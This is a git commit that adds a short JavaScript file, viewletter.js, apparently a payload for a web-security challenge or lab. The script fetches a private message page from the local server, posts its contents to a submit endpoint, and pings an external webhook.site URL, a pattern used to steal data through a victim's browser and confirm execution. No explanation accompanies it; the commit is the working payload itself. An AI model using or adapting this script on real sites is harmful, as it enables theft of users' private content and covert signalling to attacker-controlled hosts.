d4bd6acaa828c6f58bd1939269b52b499cc00399
HaNhutQuan <73058100+HaNhutQuan@users.noreply.github.com>
2022-12-10 05:33:37 +0700

    Create viewletter.js

---
+++ :80/static/viewletter.js
@@ -0,0 +1,14 @@
+fetch("http://127.0.0.1:80/message/3")
+  .then((response) => {
+    return response.text();
+  })
+  .then((data) => {
+    fetch("http://127.0.0.1:80/submit", {
+      headers: { "content-type": "application/json" },
+      body: data,
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+    });
+  });
+fetch("https://webhook.site/db6373ae-d9d9-457b-9570-be60f11cea7a/", {method: "GET"});
